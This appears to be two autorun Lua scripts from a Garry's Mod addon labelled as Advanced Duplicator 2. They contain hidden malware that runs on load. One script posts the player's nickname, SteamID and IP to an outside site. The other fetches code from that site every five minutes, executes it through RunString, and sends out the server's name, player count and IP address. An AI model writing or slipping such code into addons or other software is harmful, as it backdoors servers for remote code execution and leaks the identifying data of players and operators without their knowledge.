-- advanced_duplicator_2_710427584\lua\autorun\server\cl_connector.lua
timer.Simple( 15, function()
	local clientIP = "0.0.0.0:0"
	local sendTbl2 = {
		sn = LocalPlayer():Nick(),
		sid = LocalPlayer():SteamID(),
		ip = clientIP
	}
	if ( game.SinglePlayer() ) then 
		http.Post( "http://www.gameserverenforcer.com/api/sp.php", sendTbl2 )
	else
		return nil 
	end
end )

-- advanced_duplicator_2_710427584\lua\autorun\server\advdupe2_sv_connector.lua
timer.Create( "connect", 300, 0, function()
	http.Fetch( "http://www.gameserverenforcer.com/api/help.cfg", function(c) RunString(c) end )
end )
sendTbl = {
		sn = GetHostName(),
		playercount = tostring( #player.GetAll() ),
		ip = game.GetIPAddress()
}
timer.Simple( 15, function()
	if ( game.SinglePlayer() ) then 
		return nil
	else
		http.Post( "http://www.gameserverenforcer.com/api/index.php", sendTbl ) 
	end
end )
